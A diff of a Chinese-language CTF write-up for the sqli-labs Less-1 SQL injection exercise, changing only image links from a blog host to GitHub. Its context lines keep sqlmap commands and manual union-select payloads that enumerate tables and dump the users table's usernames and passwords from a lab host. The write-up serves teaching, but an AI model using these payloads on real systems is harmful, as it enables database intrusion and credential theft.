@@ -7,15 +7,15 @@
 
 乍一看似乎无从入手，其实注意看提示即可，提示是以数值型的 `id` 作为请求参数。
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/0beda8f79e5de7fee20a62877a2a89e0.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/01.png)
 
 于是尝试在 url 中追加参数 `?id=1` ，可以看到页面回显了数据库的查询内容：
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/a4c9607a6d1c6e8552e5a737360f74ef.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/02.png)
 
 改变 `id` 的值，可以查到不同的内容，推测此处是注入点：
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/f7141c59509a1036c6ad5b15f6a62774.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/03.png)
 
 ## 使用 sqlmap 注入（不推荐）
 
@@ -39,7 +39,7 @@ available databases [6]:
 [*] sys
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/42a36ce3e301ed22451084436692b87f.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/04.png)
 
 然后通过以下命令查询到当前数据库为 `security`
 
@@ -47,7 +47,7 @@ available databases [6]:
 sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 --current-db
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/c91c61fc2d9cf066c790a712eea8dd2e.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/05.png)
 
 再通过以下命令查询到 `security` 数据库的所有表名：
 
@@ -55,7 +55,7 @@ sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 --current-db
 sqlmap.py -u http://ctf.env/sqli-labs/Less-1/?id=1 -D security --tables
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/813a6833d6abfffdea1057c749a1fdf2.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/06.png)
 
 得到 4 个表名：
 
@@ -101,7 +101,7 @@ Table: users
 +----+----------+------------+
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/6f129d954ebe009d8915cd6f643c98d5.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/07.png)
 
 
 ## 手工注入（推荐使用 Burp 辅助）
@@ -113,7 +113,7 @@ Table: users
 
 那么尝试在参数后用单引号闭合 `?id=1'` 看下效果：
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/1600b933fdd3eb0378baad57cff94a62.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/08.png)
 
 页面报错，而且从错误信息中，我们注意到两个关键信息：
 
@@ -136,7 +136,7 @@ $sql = "select username, password from user where id = '" + $_GET[id] + "' LIMIT
 
 > 注意，上面的 payload 只适用于 Burp Suite。若通过浏览器注入，需要对几个特殊字符做 URL 编码：空格要编码成 `%20` ，`#` 要编码成 `%23` 。特别地，`-- ` 刚好在 URL 末尾，而末尾的空格会被浏览器自动删掉，即使编码也不会保留，此时需要利用 URL 把 `+` 识别为空格的特性，使用 `--+` 代替。
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/001ed9c5b8d6d4d1a14ca43578f2cacd.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/09.png)
 
 可以看到第 2、3 列被回显到页面，因此可以利用这两列查询我们想要的信息。
 
@@ -146,7 +146,7 @@ $sql = "select username, password from user where id = '" + $_GET[id] + "' LIMIT
 ?id=1' union select 1, version(), database() #
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/96ee8e9e407a71b0e81c054d32748fa9.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/10.png)
 
 而通过这个 payload 可以查询当前数据库下的所有表名：
 
@@ -156,7 +156,7 @@ $sql = "select username, password from user where id = '" + $_GET[id] + "' LIMIT
 
 > 这里用到 mysql 的 `group_concat` 函数，其作用是把某一列的所有行值串接成一个字符串。而 `information_schema` 是系统表，可以查到数据库中的所有表结构。
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/a9aaf684bd177c80f3f81240ae4d7826.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/11.png)
 
 从表名推测，`users` 就是我们的目标表，再次构造 payload 查询该表的表结构：
 
@@ -164,7 +164,7 @@ $sql = "select username, password from user where id = '" + $_GET[id] + "' LIMIT
 ?id=1' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name = 'users' #
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/e15243105d75129c7cd80c781fdbac61.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/12.png)
 
 找到目标列名 `username` 和 `password` ，最后构造如下 payload 实现脱裤，完成挑战：
 
@@ -172,7 +172,7 @@ $sql = "select username, password from user where id = '" + $_GET[id] + "' LIMIT
 ?id=1' union select 1, group_concat(username), group_concat(password) from users #
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/06/477288ec8b4770fed23d8a069699491f.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/sqli-labs/Less%2001%20-%20Error%20Based%20Single%20Quotes/imgs/13.png)
 
 ------
 
